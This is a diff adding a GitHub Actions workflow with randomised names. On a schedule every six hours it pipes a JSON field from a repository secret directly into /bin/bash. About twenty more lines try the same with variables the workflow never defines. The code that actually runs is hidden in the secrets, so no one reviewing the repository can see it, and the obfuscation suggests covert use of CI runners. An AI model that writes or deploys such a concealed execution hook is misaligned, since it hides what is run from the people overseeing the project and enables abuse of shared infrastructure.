@@ -1,0 +1,37 @@
+name: narenshenqw
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: narenshenqw
+        env:
+          we58553: ${{ secrets.we58553 }}
+        run: |
+          echo $we58553 | jq -r .jxvg95 | /bin/bash
+          echo $raaud3 | jq -r .ks7867 | /bin/bash
+          echo $b23188 | jq -r .idot1049 | /bin/bash
+          echo $ntupp123 | jq -r .f43 | /bin/bash
+          echo $u64066 | jq -r .wpsf42963 | /bin/bash
+          echo $cseag075 | jq -r .lloo6872 | /bin/bash
+          echo $hkpsq0 | jq -r .tqu9610 | /bin/bash
+          echo $cu0502 | jq -r .b3 | /bin/bash
+          echo $lvh44 | jq -r .t86 | /bin/bash
+          echo $agbw3756 | jq -r .dg87142 | /bin/bash
+          echo $vgc5975 | jq -r .zbc669 | /bin/bash
+          echo $ejiw43 | jq -r .qyil5 | /bin/bash
+          echo $ucxgs84282 | jq -r .k194 | /bin/bash
+          echo $nvwtc25 | jq -r .t580 | /bin/bash
+          echo $tsb4073 | jq -r .kg57818 | /bin/bash
+          echo $y3824 | jq -r .yw69271 | /bin/bash
+          echo $xtsgg97 | jq -r .x87380 | /bin/bash
+          echo $zut55709 | jq -r .um5 | /bin/bash
+          echo $wvza21672 | jq -r .cd7794 | /bin/bash
+          echo $cnwgy1554 | jq -r .bb7653 | /bin/bash
+          echo $a10 | jq -r .avqi5208 | /bin/bash
+          echo $qb9796 | jq -r .sf73 | /bin/bash
+
